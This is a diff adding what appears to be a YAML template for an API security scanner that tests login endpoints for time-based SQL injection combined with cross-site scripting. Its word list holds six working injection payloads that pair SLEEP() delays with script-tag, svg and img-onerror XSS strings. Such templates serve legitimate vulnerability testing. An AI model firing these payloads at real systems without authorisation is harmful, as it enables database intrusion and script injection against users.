@@ -1,0 +1,140 @@
+id: TIME_BASED_SQLI_XSS
+info:
+  name: "Time based SQL Injection Test with XSS"
+  description: > 
+    "Time-based SQL Injection testing with XSS involves exploiting SQL injection vulnerabilities by introducing time delays in the database's response to infer data extraction. Attackers inject payloads that cause the database to pause execution using functions like `SLEEP()`, and measure the delay to confirm the vulnerability. By incorporating XSS payloads, attackers can also inject malicious scripts into the application's output. This combined testing method helps identify vulnerabilities that affect both database response times and client-side security."
+  details: >
+    "Time-based SQL Injection testing with XSS involves injecting SQL payloads that introduce delays in the database's response to detect vulnerabilities. Attackers use functions like `SLEEP()` to make the database pause, and measure the delay to infer the presence of the injection flaw. Simultaneously, XSS payloads are included to inject malicious scripts into the application's output. This test uncovers weaknesses in how the application handles SQL queries and user input, revealing both server-side and client-side vulnerabilities."
+  impact: >
+    "The impact of Time-based SQL Injection combined with XSS can be severe, allowing attackers to exploit server-side vulnerabilities to delay database responses and infer data extraction. Additionally, by injecting XSS payloads, attackers can execute malicious scripts in users' browsers. This dual vulnerability can lead to unauthorized access to sensitive data, disruption of services, compromised user accounts, and significant security breaches, affecting both the application's integrity and the users' trust."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: TIME_BASED_SQLI_XSS
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains_either:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  url:
+    contains_either:
+      - login
+      - signin
+      - authenticate
+      - auth
+  request_payload:
+    for_one:
+      key:
+        regex: "^username$|^user$|^userid$|^user_id$|^login$|^login_id$|^email$|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  timeBasedPayloads:
+    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<script>alert(\"XSS\");</script>' --"
+    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<svg/onload=alert(\"XSS\")>') --"
+    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<img src=\"x\" onerror=\"alert('XSS')\"> --"
+    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<script>alert(\"XSS\");</script>') --"
+    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<svg/onload=alert(\"XSS\")>' --"
+    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<img src=\"x\" onerror=\"alert('XSS')\">') --"
+execute:
+  type: multiple
+  requests:
+  - req: 
+    - add_header:
+        dummyKey: dummyVal
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains_either:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${timeBasedPayloads}
+    - validate:
+        response_code:
+          eq: 429        
+validate:
+  and:
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - 3001
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - ${x1.response.stats.median_response_time} * 3
